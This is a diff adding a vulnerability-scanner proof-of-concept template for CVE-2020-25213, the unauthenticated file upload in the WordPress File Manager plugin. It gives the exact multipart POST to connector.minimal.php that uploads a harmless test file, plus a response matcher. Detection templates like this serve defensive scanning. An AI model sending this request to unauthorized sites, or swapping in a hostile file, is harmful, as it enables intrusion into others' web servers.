@@ -1,0 +1,51 @@
+[info]
+author = "ave"
+description = "检测 WordPress File Manager 插件 wp-file-manager 6.9 版本之前的 elFinder connector.minimal.php 未授权文件上传漏洞。通过 multipart POST 请求上传测试文件，验证文件是否成功写入目标目录。"
+id = "POC-AVE-2020-1009"
+name = "WordPress File Manager Unauthenticated File Upload PoC"
+severity = "critical"
+tags = [
+    "cve-2020-25213",
+    "wordpress",
+    "file-upload",
+]
+vuln_id = [
+    "CVE-2020-25213",
+    "AVE-2020-1009",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundary\r
+Content-Disposition: form-data; name="cmd"\r
+\r
+upload\r
+------WebKitFormBoundary\r
+Content-Disposition: form-data; name="target"\r
+\r
+l1_Lw\r
+------WebKitFormBoundary\r
+Content-Disposition: form-data; name="upload[]"; filename="test.txt"\r
+Content-Type: text/plain\r
+\r
+AVE-TEST\r
+------WebKitFormBoundary--\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundary"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["added"]
